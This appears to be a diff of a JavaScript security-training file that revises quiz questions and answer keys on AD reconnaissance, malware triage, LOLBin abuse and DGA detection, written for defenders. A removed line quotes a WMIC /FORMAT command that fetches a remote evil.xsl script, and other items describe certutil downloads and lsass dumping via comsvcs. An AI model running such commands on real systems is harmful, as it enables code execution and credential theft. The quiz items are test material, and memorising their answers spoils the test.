-            "label": "Account enumeration reconnaissance, because reading a target account's servicePrincipalName attribute is technically identical to guessing thousands of candidate usernames with a dictionary.",
+            "label": "Account enumeration reconnaissance, raised when many guessed usernames are tried over Kerberos or cLDAP",
             "value": "c"
           },
           {
-            "label": "A remote code execution alert, because querying SPNs over LDAP first requires the attacker to run collector code directly on the domain controller before any tickets can be requested.",
+            "label": "Network-mapping reconnaissance (DNS), raised when a host requests a full DNS zone listing from the DC",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Security principal reconnaissance (LDAP) is the alert built for exactly this: targeted LDAP queries for SPNs and privileged principals, the usual opening move of a Kerberoast. The SAMR option is wrong because SPN enumeration is an LDAP read, not SAMR. The account enumeration option confuses SPN attribute reads with username guessing, which is a different alert. The remote code execution option invents an RCE requirement — an ordinary authenticated LDAP read needs no code on the DC."
+        "explanation": "The evidence is targeted LDAP searches for SPN-bearing accounts and privileged principals, followed by service-ticket requests — the pattern the lesson describes for Security principal reconnaissance (LDAP), commonly the first step of a Kerberoast. The SAMR alert covers membership mapping over the SAMR protocol, but these searches travel over LDAP. Account enumeration is about guessing whether usernames exist; here the attacker reads existing accounts’ attributes instead. The DNS alert concerns DNS zone queries, and nothing in this evidence involves DNS."
       },
       {
-        "question": "In a BloodHound graph, an analyst sees the path: (svc-web) -[GenericWrite]-> (user: db-admin) -[MemberOf]-> (group: SQL-ADMINS) -[AdminTo]-> (SRV-SQL01). Which reading is correct, and what is the cleanest way to break the path?",
+        "question": "In a BloodHound graph, an analyst sees: (svc-web) -[GenericWrite]-> (user: db-admin) -[MemberOf]-> (group: SQL-ADMINS) -[AdminTo]-> (SRV-SQL01). db-admin legitimately needs its SQL-ADMINS membership. Which reading is correct, and which fix breaks the path closest to its root cause?",
         "options": [
           {
-            "label": "svc-web can write db-admin's attributes (e.g. add an SPN to Kerberoast it, or reset via further abuse), db-admin is in SQL-ADMINS, and that group is local admin on SRV-SQL01 — removing svc-web's GenericWrite edge over db-admin cuts the whole chain",
+            "label": "svc-web can write db-admin’s attributes and so take it over; remove svc-web’s GenericWrite over db-admin.",
             "value": "a"
           },
           {
-            "label": "The path is harmless because GenericWrite only ever allows changing a user's display name and telephone number, so no privilege escalation of any kind is possible along this chain and nothing needs to be remediated",
+            "label": "svc-web can reset db-admin’s password directly; remove db-admin from SQL-ADMINS to break the chain.",
             "value": "b"
           },
           {
-            "label": "The only fix is to shut down SRV-SQL01 permanently, because once any AdminTo edge exists in a domain there is no supported way to remove or reduce a BloodHound attack path short of decommissioning the target",
+            "label": "svc-web is already local admin on SRV-SQL01; take the SQL-ADMINS group off that server to cut AdminTo.",
             "value": "c"
           },
           {
-            "label": "This cannot be a real attack path since BloodHound only displays group memberships and never displays permission-based edges like GenericWrite or AdminTo between accounts and computers",
+            "label": "svc-web can write db-admin’s attributes; reset db-admin’s password so any stolen credentials stop working.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "GenericWrite over a user lets an attacker write security-relevant attributes such as servicePrincipalName (enabling a targeted Kerberoast) or DONT_REQ_PREAUTH (targeted AS-REP roast), so svc-web can take over db-admin, who is in SQL-ADMINS, which is AdminTo SRV-SQL01. The surgical fix is to remove the single unnecessary GenericWrite edge, which breaks every path that traversed it. The claim that the path is harmless understates GenericWrite. The claim that SRV-SQL01 must be shut down is false — edges are removed by fixing delegation, not decommissioning hosts. The claim that BloodHound never shows permission edges is wrong — BloodHound's whole value is mapping ACL and access edges, not just membership."
+        "explanation": "GenericWrite lets svc-web write non-protected attributes of db-admin (per the lesson’s edge table, for example setting an SPN for a targeted Kerberoast), which leads to taking over db-admin; db-admin is in SQL-ADMINS, and that group is AdminTo SRV-SQL01. The unnecessary delegation is the GenericWrite edge, so removing it breaks every path through it without touching legitimate SQL administration. The password-reset reading describes ForceChangePassword, not GenericWrite, and removing the membership breaks a legitimate business need. The “already local admin” reading ignores the first two hops: svc-web reaches SRV-SQL01 only through db-admin and SQL-ADMINS. Resetting db-admin’s password reads the edge correctly but leaves it in place, so svc-web can take the account over again."
       }
     ],
     "references": [
@@ -1205,142 +1205,142 @@ const NEW_TOPIC_LESSONS = [
     ],
     "quiz": [
       {
-        "question": "A packed executable arrives in your queue. Static analysis shows almost no readable strings and only a handful of imports, all related to memory allocation. What is the most effective next triage step?",
+        "question": "A packed executable arrives in your queue. Its hash is unknown to VirusTotal, static analysis shows almost no readable strings and only a handful of imports, all related to memory allocation, and section entropy is near 7.9. What is the most effective next triage step?",
         "options": [
           {
-            "label": "Conclude the file is benign because it has too few imports to do anything malicious on the host.",
+            "label": "Run FLOSS to decode the hidden strings, and close the alert as benign if nothing meaningful decodes",
             "value": "a"
           },
           {
-            "label": "Detonate the sample in an isolated sandbox so it unpacks itself and reveals its real behaviour.",
+            "label": "Detonate it in an isolated sandbox so it unpacks itself and its real behaviour can be recorded",
             "value": "b"
           },
           {
-            "label": "Delete the file immediately and close the alert since packed files are always false positives.",
+            "label": "Compute its imphash, and close the alert as benign if no known campaign in TI shares that imphash",
             "value": "c"
           },
           {
-            "label": "Run the sample directly on your own workstation to save time and watch the network traffic.",
+            "label": "Disassemble it in Ghidra and read the unpacking routine yourself before reaching any verdict",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Packing hides strings and imports until runtime, so dynamic detonation in an isolated sandbox captures the unpacked code and behaviour. Concluding the file is benign is wrong because few imports plus high entropy signals packing, not innocence. Deleting the file and closing the alert discards evidence and IOCs on a false premise. Running the sample on your own workstation is a dangerous safety violation — never run suspected malware on a production or personal host."
+        "explanation": "High entropy, sparse strings and memory-allocation-only imports are the packing signature: the real code only appears in memory at runtime, so dynamic detonation in an isolated sandbox is the step that defeats packing by construction. The FLOSS option uses the right tool for stack strings and simple obfuscation, but FLOSS does not unpack a packed file, so 'nothing decoded' says nothing about innocence. The imphash option treats 'unknown' as 'benign'; an unknown imphash only means no known cluster, and the hash is already unknown too. The Ghidra option is advanced static analysis (level 3), which the lesson places with dedicated reverse engineers rather than alert-queue triage, and a sandbox reaches the unpacked code without manually reversing the packer."
       },
       {
-        "question": "A sandbox report for a suspicious sample comes back completely clean — no file, registry, or network activity. Threat intel and the delivery context still look suspicious. How should you interpret this?",
+        "question": "A suspicious attachment's hash is unknown to VirusTotal, and its sandbox report comes back completely clean: no file, registry, or network activity. The delivery context (an unexpected invoice from a lookalike domain) still looks suspicious. How should you treat this result?",
         "options": [
           {
-            "label": "The clean report proves the file is safe, so you can confidently close the alert without further work.",
+            "label": "As benign: an unknown hash plus a clean detonation means neither static nor dynamic analysis found malice",
             "value": "a"
           },
           {
-            "label": "The sandbox is broken and its results should always be ignored in favour of static analysis alone.",
+            "label": "Re-detonate once with a longer analysis window, and close it as benign if that second run is also clean",
             "value": "b"
           },
           {
-            "label": "The malware may be sandbox-aware and evading analysis, so treat the clean result with suspicion.",
+            "label": "As possible sandbox evasion (T1497): weigh it against the delivery context and do not close on it alone",
             "value": "c"
           },
           {
-            "label": "Network activity is optional for malware, so the missing traffic is normal and not worth noting.",
+            "label": "Mark it inconclusive and close it, since the sandbox report is the final step of the triage workflow",
             "value": "d"
           }
         ],
         "answer": "c",
-        "explanation": "Sandbox-aware malware uses sleeps and environment checks (MITRE T1497) to stay dormant and produce a clean report, so a clean verdict against suspicious context warrants suspicion, not closure. Claiming the clean report proves the file safe treats absence of evidence as evidence of absence. Declaring the sandbox broken overreacts — sandboxes are useful, just not infallible. Calling the missing network activity normal ignores that the total absence of any activity from a flagged file is itself a red flag for evasion."
+        "explanation": "Sandbox-aware malware uses VM/system checks, user-activity checks and long sleeps (MITRE T1497) to stay dormant and produce a clean report, so a clean result against a suspicious delivery context is a reason for suspicion, not closure. The 'unknown hash plus clean detonation' option treats two absences as proof; an unknown hash is not a clean bill, and a clean run may be evasion. The 'longer window, then close' option uses a real mitigation but only addresses time-based evasion; VM-artifact checks, user-activity checks or domain gating would keep the second run clean too. The 'inconclusive and close' option misreads the workflow: the sandbox is step 3, followed by IOC extraction and scoping, and an inconclusive evasive sample is a case to escalate, not to close."
       },
       {
-        "question": "Static analysis on a file shows entropy near 7.9 in its only section, almost no readable strings, and imports limited to memory-allocation functions. What does this most likely indicate, and what should the analyst do next?",
+        "question": "You confirmed a dropper as malicious. Its SHA-256 has no other hits in your EDR file corpus, but threat intel says the actor rebuilds and lightly modifies the dropper for every victim, using the same injection toolkit. Which pivot best finds related samples already in your environment?",
         "options": [
           {
-            "label": "The file is corrupted and unreadable, so no further analysis is possible and the alert should be closed.",
+            "label": "Search the corpus for the sample's MD5, which still matches variants that differ by only a few bytes",
             "value": "a"
           },
           {
-            "label": "The file is packed, hiding its real code until it unpacks itself at runtime, so it should be detonated in an isolated sandbox next.",
+            "label": "Pivot on its imphash and ssdeep, which stay alike across rebuilt variants while each SHA-256 changes",
             "value": "b"
           },
           {
-            "label": "The high entropy proves the file is ransomware, so it should be deleted immediately without further review.",
+            "label": "Re-run the SHA-256 search daily, since rebuilt variants keep one SHA-256 while their code is unchanged",
             "value": "c"
           },
           {
-            "label": "The few imports mean the file is too simple to be malicious, so static analysis alone is sufficient to close it as benign.",
+            "label": "Search for the dropper's file name and size, which rebuilt variants of the same family usually keep",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Entropy near the maximum, combined with sparse strings and imports limited to memory allocation, is the classic packing signature (as with UPX), not corruption — the correct next step is dynamic detonation to observe the unpacked code, exactly the static-hits-a-wall-then-dynamic-takes-over pattern from this lesson. The 'corrupted and unreadable' option wrongly assumes corruption. The 'proves ransomware' option jumps to a specific verdict the evidence does not support and would destroy IOCs. The 'too simple to be malicious' option ignores that a packed file's true imports are hidden until it runs, so few visible imports say nothing about real capability."
+        "explanation": "SHA-256 answers 'is this the same file', while imphash and ssdeep answer 'is this the same kind of file'. Builds from one injection toolkit tend to share an imphash (the same imports in the same order), and ssdeep scores stay high across lightly modified data, so pivoting on them finds the rest of the family. The MD5 option confuses hash families: MD5 is a cryptographic hash, so changing a single byte produces a completely different value. The daily SHA-256 option is wrong because any rebuild or byte change produces a new SHA-256, so the search can only ever find the one file you already have. The file-name-and-size option relies on attributes the attacker controls and that change with every rebuild; neither is a fingerprint of the code."
       },
       {
-        "question": "A YARA rule's condition combines several elements: a PE-file header check, a regex-matched URL string, and both of two named import strings. Why write the condition this way instead of alerting on just the URL string alone?",
+        "question": "The lesson's YARA rule fires only when the image starts with MZ, contains a URL matching the gate.php regex, and contains both injection-related import names. Why write the condition this way instead of alerting on the URL string alone?",
         "options": [
           {
-            "label": "Combining conditions is purely stylistic; a single matching string always produces the exact same detection accuracy as combining several",
+            "label": "For speed: the extra clauses let YARA skip files sooner, while matching accuracy stays the same as the URL alone",
             "value": "a"
           },
           {
-            "label": "Requiring the PE header, the URL pattern, and both imports together narrows false positives that any single string match alone would produce",
+            "label": "Requiring all clauses together cuts the false positives that a lone URL match would produce on benign files",
             "value": "b"
           },
           {
-            "label": "YARA cannot evaluate more than one string at a time, so listing multiple strings is required purely for syntax reasons and has no effect on accuracy",
+            "label": "Because YARA syntax requires a header check plus at least two named strings in every rule's condition",
             "value": "c"
           },
           {
-            "label": "The condition section only affects performance speed and has no bearing on which files the rule ultimately matches",
+            "label": "So the rule also fires on the packed file on disk, where UPX hides the URL but leaves the import names",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Combining a PE-header check, a suspicious URL pattern, and both injection-related imports in one condition means the rule only fires when multiple independent signals align, sharply reducing false positives compared to matching on one generic string that could appear in many unrelated, benign files. The claim that combining conditions is purely stylistic is false — combining conditions materially changes detection precision. The claim that YARA evaluates one string at a time misstates YARA's design; it evaluates all listed strings together. The claim that the condition only affects speed is wrong — the condition entirely determines whether the rule matches, not just its speed."
+        "explanation": "Each clause narrows the match: the rule fires only when the image is a PE file AND carries the C2-style URL AND imports both injection APIs, which cuts the false positives a single string would produce on unrelated files. The speed option gets one thing right (the cheap header check runs first), but adding required clauses changes which files match, so accuracy is not the same as the URL alone. The syntax option is false: a YARA condition can be a single string or any boolean expression. The packed-file option inverts the lesson: UPX hides both the URL and the injection imports on disk, which is why this rule is written for the unpacked image, such as a sandbox memory dump, and would miss the packed file."
       },
       {
         "question": "A SOC ingests thousands of email attachments per day and cannot manually run the five-step triage workflow on every file. What does 'hybrid analysis' contribute to an automated pipeline that pure static or pure dynamic analysis alone cannot provide?",
         "options": [
           {
-            "label": "It applies static techniques like YARA and hashing against a sample's memory dump after a sandbox has let it unpack itself, combining static precision with code dynamic execution revealed",
+            "label": "It runs YARA, strings and imphash on the sandbox memory dump after the sample has unpacked itself",
             "value": "a"
           },
           {
-            "label": "It replaces sandboxing entirely, since hybrid analysis can fully detonate malware without ever running any code",
+            "label": "It runs the static pass and the sandbox side by side on the packed file, then merges the two reports",
             "value": "b"
           },
           {
-            "label": "It only renames the dynamic analysis report file so a SOAR platform can read it, with no additional technical capability",
+            "label": "It fast-forwards sleep calls in the sandbox, so time-based evasion cannot outlast the analysis window",
             "value": "c"
           },
           {
-            "label": "It guarantees a sample is never sandbox-aware, since hybrid analysis techniques cannot be detected or evaded by malware",
+            "label": "It disassembles the packed file statically, so the real code is read without the sample ever running",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "Hybrid analysis runs a sample dynamically specifically to let it unpack itself, then applies static techniques (strings, YARA, imphash, header inspection) against that unpacked memory — getting static analysis's exact precision applied to code that only exists once dynamic execution removed the packer. The claim that it replaces sandboxing entirely is self-contradictory: 'detonation without running code' is not detonation at all. The 'only renames the report file' option trivializes a real technical capability into file management. The claim that a sample is never sandbox-aware overclaims; sandbox-aware evasion (T1497) can still affect hybrid analysis if the sample never unpacks during the observation window."
+        "explanation": "Hybrid analysis runs a sample in a sandbox to let it unpack itself, then applies static techniques (strings, YARA, imphash, header inspection) to the unpacked memory, giving static precision on code that only exists after execution removed the packer; in the playbook this is run_yara(report.memory_dump). The 'side by side, then merge' option still points the static pass at the packed file, so it inherits the packing blind spot. The 'fast-forward sleeps' option is a sandbox anti-evasion mitigation, not hybrid analysis. The 'disassemble statically' option is advanced static analysis; on a packed file the real code is still compressed, and the lesson treats disassembly as reverse-engineering work rather than automated triage."
       },
       {
-        "question": "A file named quarterly_report.pdf lands in your queue, but when you inspect it with the file command its first bytes are 4D 5A (ASCII MZ) rather than %PDF. Static tooling also shows a PE import table. What does this tell you?",
+        "question": "A file named quarterly_report.pdf lands in your queue. Inspecting it with the file command shows its first bytes are 4D 5A rather than 25 50 44 46, and static tooling also shows a PE import table. What does this tell you?",
         "options": [
           {
-            "label": "Nothing useful — the file extension is the authoritative source of a file’s true type, so it should be treated as an ordinary PDF and opened in a reader.",
+            "label": "It is a PDF with an embedded executable object; extract that object with pdf-parser and analyse it",
             "value": "a"
           },
           {
-            "label": "The magic bytes reveal the file is actually a Windows executable disguised with a .pdf extension, and this extension-versus-signature mismatch is itself strong evidence of malicious intent.",
+            "label": "It is a Windows executable with a fake .pdf extension, and that mismatch is strong evidence of malice",
             "value": "b"
           },
           {
-            "label": "The MZ header proves the file is corrupted and unreadable, so the alert can be closed with no further action.",
+            "label": "It is a valid PDF with a PE overlay appended at its end; open it in a sandboxed PDF reader to check",
             "value": "c"
           },
           {
-            "label": "All PDFs legitimately begin with MZ, so the header is normal and the file is safe to distribute.",
+            "label": "It is a legacy Office document carrying a macro; run olevba on it to extract the embedded VBA code",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "The magic bytes at the start of a file, not the extension, define its true type. A file claiming to be a .pdf whose bytes begin with MZ (4D 5A) is really a Windows PE executable wearing a fake extension, and that mismatch is a classic sign of a malicious attachment. Treating the extension as authoritative inverts reality — the extension is trivially faked and is never authoritative. Calling the file corrupted is wrong: MZ is a valid executable header, not corruption. The claim that all PDFs begin with MZ is false; legitimate PDFs begin with %PDF (25 50 44 46), never MZ."
+        "explanation": "Magic bytes, not the extension, define a file's real type. 4D 5A (MZ) is the Windows PE signature, so this is an executable wearing a .pdf name, and an extension-versus-signature mismatch is strong evidence of malicious intent. The embedded-object option would still start with %PDF (25 50 44 46), since a real PDF carrying an object begins with the PDF signature. The appended-overlay option has the same flaw: data added at the end does not change the first bytes, which here are MZ. The legacy-Office option does not fit either: OLE2 documents begin with D0 CF 11 E0, not 4D 5A."
       }
     ],
     "references": [
@@ -1623,143 +1623,143 @@ const NEW_TOPIC_LESSONS = [
         "question": "During triage you see outlook.exe spawn mshta.exe, which then launches certutil.exe running with a -urlcache argument pointed at an external URL. Why is blocking certutil.exe by name a poor primary defence here?",
         "options": [
           {
-            "label": "Certutil is malware that Microsoft accidentally ships, so blocking it by name fully resolves the threat.",
+            "label": "Certutil requires administrator rights to run, so standard-user endpoints are already immune to this chain.",
             "value": "a"
           },
           {
-            "label": "Certutil is a legitimate signed system tool relied on by Windows, so detection must target its abusive usage instead.",
+            "label": "Certutil is a signed Windows component other processes depend on, so detection must target its abusive usage, not its name.",
             "value": "b"
           },
           {
-            "label": "Certutil cannot make network connections at all, so the observed download must be a false positive.",
+            "label": "The parent chain is routine, since Outlook normally launches mshta to render attachments, so this is likely a false positive.",
             "value": "c"
           },
           {
-            "label": "Blocking by name is impossible in Windows because binaries have no filenames the system can read.",
+            "label": "An attacker can simply copy certutil to a new filename, so a name-based block is trivially sidestepped by a rename.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Certutil is a legitimate, signed, system-relied-upon binary, so you cannot simply block it; you detect on abusive usage like -urlcache downloads and suspicious parent chains. The 'accidentally shipped malware' option is false — certutil is a genuine certificate tool, not malware. The claim that certutil cannot make network connections is wrong: certutil can and here does make outbound connections, which is exactly the abuse. The claim that blocking by name is impossible is technically incorrect; application control can absolutely target filenames, but doing so here would break legitimate functionality."
+        "explanation": "Certutil is a legitimate, signed, system-relied-upon binary, so you detect on abusive usage — a -urlcache download launched by an unusual parent chain — rather than block the name, which would break Windows functionality. The “administrator rights” option is wrong: certutil runs fine as a standard user and the download needs no elevation. The “routine parent chain” option inverts reality — Outlook spawning mshta spawning certutil is a textbook phishing-to-execution chain, not normal behaviour. The “copy it to a new filename” option is a true fact about why name-blocking is weak, but it does not explain the real reason you cannot block certutil at all, which is that Windows itself depends on it."
       },
       {
         "question": "Your organization wants to reduce LOLBin abuse without breaking legitimate Windows operations. Which approach best fits that goal?",
         "options": [
           {
-            "label": "Uninstall rundll32, regsvr32, and certutil from every endpoint to remove the binaries entirely.",
+            "label": "Uninstall rundll32, regsvr32, and certutil from every endpoint so the binaries are simply gone.",
             "value": "a"
           },
           {
-            "label": "Disable all command-line logging to cut noise, then rely only on file-hash blocklists for detection.",
+            "label": "Turn off command-line logging to cut alert noise, then rely on file-hash blocklists to catch the payloads.",
             "value": "b"
           },
           {
-            "label": "Deploy WDAC/AppLocker with Microsoft's recommended block rules plus ASR rules and command-line logging.",
+            "label": "Deploy WDAC/AppLocker with Microsoft's recommended block rules, add ASR rules, and keep command-line logging on.",
             "value": "c"
           },
           {
-            "label": "Trust every Microsoft-signed binary automatically and stop monitoring their process activity for anomalies.",
+            "label": "Allowlist every Microsoft-signed binary and stop reviewing their process activity, since signed code is trusted.",
             "value": "d"
           }
         ],
         "answer": "c",
-        "explanation": "WDAC/AppLocker with Microsoft's recommended block rules restricts how abused binaries run, ASR blocks common LOTL chains, and command-line logging enables detection — all without removing essential tools. Uninstalling rundll32, regsvr32, and certutil would break Windows, since these binaries are core dependencies. Disabling command-line logging is counterproductive: command-line logging is the key enabler for LOLBin detection, and file hashes do not help against trusted binaries. Automatically trusting every Microsoft-signed binary is precisely the flawed trust assumption LOLBins exploit."
+        "explanation": "WDAC/AppLocker with Microsoft's recommended block rules restricts how abused binaries run, ASR rules block common LOTL chains, and command-line logging keeps detection possible — all without removing essential tools. Uninstalling rundll32, regsvr32, and certutil would break Windows, since these are core dependencies. Turning off command-line logging is self-defeating: those arguments are the single most important signal for LOLBin detection, and hashes do not help against trusted binaries. Allowlisting every signed binary and ignoring their activity is exactly the misplaced trust that LOLBins exploit."
       },
       {
         "question": "An analyst checks Windows Security Event ID 4688 for the command-line arguments used to launch mshta.exe, but the CommandLine field is empty even though the process name is recorded. What is the most likely cause and the correct fix?",
         "options": [
           {
-            "label": "4688 can never record command-line arguments under any configuration, so Sysmon must be deployed instead.",
+            "label": "4688 captures arguments for elevated processes, so the blank field means mshta ran as a standard user.",
             "value": "a"
           },
           {
-            "label": "The 'include command line in process creation events' Group Policy setting has not been enabled, so it must be turned on for 4688 to capture arguments.",
+            "label": "The 'include command line in process creation events' Group Policy setting is not enabled; turn it on so 4688 captures arguments.",
             "value": "b"
           },
           {
-            "label": "mshta.exe deletes its own command line from the event log after execution, so no Windows setting can recover it.",
+            "label": "The arguments exceeded the Security log's field size and were truncated; raising the log's maximum size restores them.",
             "value": "c"
           },
           {
-            "label": "CommandLine only appears in Sysmon Event ID 3 network events, so the analyst should check network connections instead.",
+            "label": "Command-line data is recorded in Sysmon's network-connection event, so pivot to those events instead.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Windows Security Event ID 4688 only populates the CommandLine field when the 'include command line in process creation events' Group Policy setting is enabled; without it the field stays blank even though process creation is still logged. The claim that 4688 can never record arguments is wrong because 4688 can capture command lines once that policy is turned on. The claim that mshta.exe deletes its own command line invents a self-deleting log behaviour that does not exist. The 'Sysmon Event ID 3' option confuses Sysmon Event ID 3 (network connections) with process creation, where command-line data actually lives (Sysmon Event ID 1, or a properly configured 4688)."
+        "explanation": "Windows Event ID 4688 populates CommandLine only when the 'include command line in process creation events' Group Policy is enabled; without it the field stays blank while process creation is still logged. The “elevated processes only” option invents a privilege condition that does not govern this field. The “field truncated by log size” option confuses log capacity with whether the data is captured at all — the policy, not the log size, is why the field is empty. The “only in the network-connection event” option misplaces command-line data, which lives in process-creation events (Sysmon Event ID 1 or a properly configured 4688), not network events."
       },
       {
-        "question": "Sysmon Event ID 1 shows: wmic.exe os get /FORMAT:\"http://198.51.100.20/evil.xsl\" launched from an unusual parent process. What is happening, and which technique is this?",
+        "question": "Sysmon Event ID 1 shows wmic.exe invoked with a /FORMAT argument pointing at a remote .xsl file on an external host, launched from an unusual parent process. What is happening, and which technique is this?",
         "options": [
           {
-            "label": "WMIC is downloading a routine Windows update manifest; /FORMAT is only used for formatting local text output, never remote content.",
+            "label": "A scheduled WMI performance query; the /FORMAT switch just applies a local stylesheet to tidy console output.",
             "value": "a"
           },
           {
-            "label": "This is the 'Squiblytwo' technique (T1220, XSL Script Processing): WMIC's /FORMAT switch is fetching a remote XSL file containing embedded malicious script.",
+            "label": "The 'Squiblytwo' technique (T1220, XSL Script Processing): the /FORMAT switch is loading a remote XSL file carrying embedded script.",
             "value": "b"
           },
           {
-            "label": "WMIC cannot accept URLs as arguments, so this command line would fail immediately and can be dismissed as a logging artifact.",
+            "label": "The 'Squiblydoo' technique (T1218.010): this is the regsvr32 remote-scriptlet abuse, here surfacing through WMIC.",
             "value": "c"
           },
           {
-            "label": "This is DCSync, since WMIC is querying operating system replication metadata from a remote domain controller.",
+            "label": "System Script Proxy Execution (T1216) via SyncAppvPublishingServer.vbs, which WMIC calls to run the stylesheet.",
             "value": "d"
           },
           {
-            "label": "This is a benign SNMP polling request that IT monitoring tools issue automatically on a schedule.",
+            "label": "DCSync, since WMIC is pulling domain replication metadata from a domain controller over the formatting channel.",
             "value": "e"
           }
         ],
         "answer": "b",
-        "explanation": "WMIC's /FORMAT switch will fetch and apply a remote XSL stylesheet, and adversaries embed JScript/VBScript inside that stylesheet for execution — the 'Squiblytwo' technique, tracked as T1220. The 'routine update manifest' option is false; /FORMAT explicitly supports remote URLs, which is the core of the abuse. The claim that WMIC cannot accept URLs is incorrect — WMIC does accept and fetch remote URLs via /FORMAT. The replication-metadata option confuses this with DCSync, an unrelated Active Directory replication abuse. The benign SNMP polling option invents an SNMP explanation unrelated to WMIC or XSL processing."
+        "explanation": "WMIC's /FORMAT switch will fetch and apply a remote XSL stylesheet, and adversaries embed JScript/VBScript inside it for execution — the 'Squiblytwo' technique, tracked as T1220. The “local stylesheet only” option is false: /FORMAT accepts a remote URL, which is the abuse. The 'Squiblydoo' option names the sibling technique that uses regsvr32 and a .sct scriptlet, not WMIC and XSL. The SyncAppvPublishingServer.vbs option describes a different signed-script proxy (T1216) that WMIC is not involved in. The DCSync option confuses this with Active Directory replication abuse, unrelated to XSL processing."
       },
       {
-        "question": "Sysmon Event ID 6 shows a genuinely Microsoft/vendor-signed kernel driver (RTCore64.sys) loading from C:\\Windows\\Temp rather than System32\\drivers, immediately followed by security-product processes terminating. What best explains this?",
+        "question": "Sysmon Event ID 6 shows a genuinely vendor-signed kernel driver (RTCore64.sys) loading from C:\\Windows\\Temp rather than System32\\drivers, immediately followed by security-product processes terminating. What best explains this?",
         "options": [
           {
-            "label": "A routine Windows Update driver rollback, since signed drivers are always staged from Temp before final installation.",
+            "label": "A routine Windows Update driver rollback; signed drivers are normally staged from the Temp folder before installation.",
             "value": "a"
           },
           {
-            "label": "A Bring Your Own Vulnerable Driver (BYOVD) attack: the attacker loaded a legitimately signed but exploitable driver to gain kernel access and disable security tooling.",
+            "label": "A Bring Your Own Vulnerable Driver (BYOVD) attack: a validly signed but exploitable driver loaded to gain kernel access and disable security tooling.",
             "value": "b"
           },
           {
-            "label": "Driver Signature Enforcement blocked the load, so no code executed and the terminated processes are unrelated.",
+            "label": "A normal vendor driver update; because the signature is valid, the coinciding security-tool shutdowns are unrelated.",
             "value": "c"
           },
           {
-            "label": "This is a Squiblydoo attack, since regsvr32.exe is responsible for registering all kernel-mode drivers on Windows.",
+            "label": "A Driver Signature Enforcement bypass through test-signing mode, which lets an unsigned driver load after a reboot into test mode.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "A validly signed but known-vulnerable driver loaded from an unusual path (Temp instead of System32\\drivers), followed by security-tool termination, is the signature of BYOVD (T1068) paired with Impair Defenses (T1562.001) — the driver's genuine signature passes Driver Signature Enforcement, but its vulnerability grants kernel-level code execution. The Windows Update rollback option is fabricated; legitimate driver installs do not stage from Temp. The claim that Driver Signature Enforcement blocked the load is wrong — the event log shows the driver successfully loaded (Signed: true), not blocked. Calling this a Squiblydoo attack misapplies Squiblydoo, which is a regsvr32/COM scriptlet technique unrelated to kernel driver loading."
+        "explanation": "A validly signed but known-vulnerable driver loading from an unusual path, followed by security-tool termination, is the BYOVD signature (T1068) paired with Impair Defenses (T1562.001): the genuine signature passes Driver Signature Enforcement, but the driver's vulnerability grants kernel-level code execution. The “Windows Update rollback” option is fabricated — legitimate driver installs do not stage from Temp. The “normal vendor update, shutdowns unrelated” option ignores the obvious correlation between the load and the security tools dying. The “test-signing bypass” option describes loading an unsigned driver, but here the driver is already validly signed, so test-signing is not the mechanism."
       },
       {
-        "question": "During triage you see rundll32.exe invoking the MiniDump export of comsvcs.dll against lsass.exe. In LOLBAS terms, what kind of file is comsvcs.dll being used as, and what capability has the attacker just gained?",
+        "question": "During triage you see rundll32.exe invoking the MiniDump export of comsvcs.dll against lsass.exe. In LOLBAS terms, what role is comsvcs.dll playing, and what capability has the attacker gained?",
         "options": [
           {
-            "label": "It is a LOLLib — a signed Microsoft library whose legitimate MiniDump export is abused to dump lsass.exe memory, giving credential access with no external tool on the host.",
+            "label": "It is a LOLLib — a signed Microsoft library whose MiniDump export, run through rundll32, dumps process memory to steal credentials.",
             "value": "a"
           },
           {
-            "label": "It is a LOLScript, and the command only reads a help file, so no security-relevant capability is involved.",
+            "label": "It is the LOLBin here — rundll32 is the signed executable being abused, so comsvcs.dll is only the argument it was pointed at.",
             "value": "b"
           },
           {
-            "label": "comsvcs.dll is unsigned malware dropped by the attacker, so blocking that one file name fully solves the problem.",
+            "label": "It is a sideloaded DLL — the attacker planted a malicious comsvcs.dll beside rundll32 so it loads in place of the real library.",
             "value": "c"
           },
           {
-            "label": "rundll32 cannot load DLL exports, so this command does nothing and can be safely ignored.",
+            "label": "It is a LOLScript — comsvcs.dll is a signed Windows script, and the MiniDump call merely reads a local diagnostics log.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "comsvcs.dll is a legitimate, signed Windows library — a LOLLib in LOLBAS terms — and its MiniDump export, invoked through rundll32, dumps a target process’s memory; pointed at lsass.exe it extracts credential material, the living-off-the-land alternative to a tool like Mimikatz. The LOLScript option misclassifies a .dll as a script and downplays a serious action. The 'unsigned malware' option is false: it is a signed Microsoft DLL, not dropped malware, so name-blocking does not apply. The claim that rundll32 cannot load DLL exports is wrong — running exported DLL functions is exactly what rundll32 does."
+        "explanation": "comsvcs.dll is a legitimate, signed Windows library — a LOLLib in LOLBAS terms — and its MiniDump export, invoked through rundll32, dumps a target process's memory; pointed at lsass.exe it yields credential material, the living-off-the-land alternative to a tool like Mimikatz. The LOLBin option is a tempting half-truth: rundll32 is indeed a LOLBin, but the question asks about comsvcs.dll, which is the library (LOLLib) being abused. The sideloaded-DLL option describes DLL search-order hijacking, a different technique — comsvcs.dll is the real signed library, not a planted copy. The LOLScript option misclassifies a .dll as a script and downplays a credential-dumping action as log reading."
       }
     ],
     "references": [
@@ -2435,96 +2435,96 @@ const NEW_TOPIC_LESSONS = [
         "explanation": "Correct: a flood of high-entropy hostname lookups mostly returning NXDOMAIN is the classic DGA signature — malware tries many algorithmic domains until it finds the one currently registered for C2. The caching-failure option is wrong: caching failures repeat the *same* name, not many unique high-entropy names. The normal web browsing option is wrong: legitimate browsing resolves recognizable domains and does not produce mass NXDOMAIN responses. The DNSSEC validation failure option is wrong: DNSSEC validation concerns signature checks on real records, not the generation of hundreds of random nonexistent names."
       },
       {
-        "question": "Your organization logs DNS at the internal recursive resolver. Some endpoints begin using an external DNS-over-HTTPS (DoH) resolver. What is the security impact and best response?",
